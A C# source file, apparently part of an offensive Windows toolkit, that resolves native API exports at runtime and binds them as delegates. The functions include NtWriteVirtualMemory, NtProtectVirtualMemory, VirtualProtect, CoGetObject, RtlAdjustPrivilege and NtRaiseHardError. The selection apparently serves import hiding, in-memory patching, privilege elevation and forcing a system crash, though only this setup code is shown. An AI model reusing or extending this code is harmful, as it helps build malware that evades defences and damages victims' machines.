using System;
using System.Runtime.InteropServices;
using static Offline.Special.Commons;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Offline.Special
{
    internal class DelegatesHandling
    {
        internal unsafe static void PrepareDelegate()
        {
            IntPtr ntWriteVirtual = Resolver.GetExportAddress("ntdll.dll", "NtWriteVirtualMemory");
            IntPtr ntVirtualProtect = Resolver.GetExportAddress("ntdll.dll", "NtProtectVirtualMemory");

            IntPtr rtlInitUnicode = Resolver.GetExportAddress("ntdll.dll", "RtlInitUnicodeString");
            IntPtr rtlEnterCritical = Resolver.GetExportAddress("ntdll.dll", "RtlEnterCriticalSection");
            IntPtr rtlLeaveCritical = Resolver.GetExportAddress("ntdll.dll", "RtlLeaveCriticalSection");

            IntPtr coGet = Resolver.GetExportAddress("ole32.dll", "CoGetObject");

            ntWriteVirtualMemory = (NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(ntWriteVirtual, typeof(NtWriteVirtualMemory));    
            ntProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(ntVirtualProtect, typeof(NtProtectVirtualMemory));
            
            rtlInitUnicodeString = (RtlInitUnicodeString)Marshal.GetDelegateForFunctionPointer(rtlInitUnicode, typeof(RtlInitUnicodeString));
            rtlEnterCriticalSection = (RtlEnterCriticalSection)Marshal.GetDelegateForFunctionPointer(rtlEnterCritical, typeof(RtlEnterCriticalSection));
            rtlLeaveCriticalSection = (RtlLeaveCriticalSection)Marshal.GetDelegateForFunctionPointer(rtlLeaveCritical, typeof(RtlLeaveCriticalSection));

            coGetObject = (CoGetObject)Marshal.GetDelegateForFunctionPointer(coGet, typeof(CoGetObject));






            IntPtr loadLib = Resolver.GetExportAddress("kernel32.dll", "LoadLibraryW");
            IntPtr virtualProt = Resolver.GetExportAddress("kernel32.dll", "VirtualProtect");

            loadLibrary = (LoadLibrary)Marshal.GetDelegateForFunctionPointer(loadLib, typeof(LoadLibrary));
            virtualProtect = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(virtualProt, typeof(VirtualProtect));







            IntPtr rtlAdjustPriv = Resolver.GetExportAddress("ntdll.dll", "RtlAdjustPrivilege");
            IntPtr ntRaiseHard = Resolver.GetExportAddress("ntdll.dll", "NtRaiseHardError");
            rtlAdjustPrivilege = (RtlAdjustPrivilege)Marshal.GetDelegateForFunctionPointer(rtlAdjustPriv, typeof(RtlAdjustPrivilege));
            ntRaiseHardError = (NtRaiseHardError)Marshal.GetDelegateForFunctionPointer(ntRaiseHard, typeof(NtRaiseHardError));





            ntProtectVirtualMemorySafe = (NtProtectVirtualMemorySafe)Marshal.GetDelegateForFunctionPointer(ntVirtualProtect, typeof(NtProtectVirtualMemorySafe));





            ntWriteVirtualMemorySafe = (NtWriteVirtualMemorySafe)Marshal.GetDelegateForFunctionPointer(ntWriteVirtual, typeof(NtWriteVirtualMemorySafe));
        }
    }
}
